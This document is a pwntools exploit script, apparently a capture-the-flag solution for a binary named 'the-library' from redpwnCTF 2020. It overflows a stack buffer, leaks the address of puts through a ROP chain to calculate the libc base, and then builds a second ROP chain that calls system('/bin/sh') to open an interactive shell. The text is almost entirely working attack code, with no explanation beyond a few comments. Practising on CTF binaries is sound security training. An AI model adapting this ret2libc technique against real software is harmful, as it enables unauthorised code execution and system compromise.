from pwn import *

context= ['tmux', 'new-window']
#p= remote('2020.redpwnc.tf', 31350)
p= process('./the-library')
#gdb.debug('./the-library')
elf= ELF('./the-library')
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')

puts_plt = 0x0000000000400520
puts_got = 0x601018
pop_rdi  = 0x0000000000400733
ret      = 0x0000000000400506
main     = 0x0000000000400637

payload = 'A'*24
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
p.sendline(payload)
#print(p.recvline())
#
leak= u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
log.info('Puts leaked address: ' + (hex(leak)))

libc_base = leak -libc.sym['puts']
log.info("Address of libc %s " % hex(libc_base))

libc_gadget= libc_base + 0x10a38c #0x4f322#0x4f2c5

BINSH = libc_base + 0x1b3e9a #next(libc.search("/bin/sh")) #Verify with find /bin/sh libc6_2.27-3ubuntu1_amd64.so
SYSTEM = libc_base + libc.sym["system"] #+ libc_base
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

print(p.recvuntil('name?\n'))
#p.recvuntil('Enter your pwnagotchi\'s name: \n')                   
payload2 = 'A'*24 +p64(ret) + p64(pop_rdi) + p64(BINSH) + p64(SYSTEM)

p.sendline(payload2)


p.interactive()

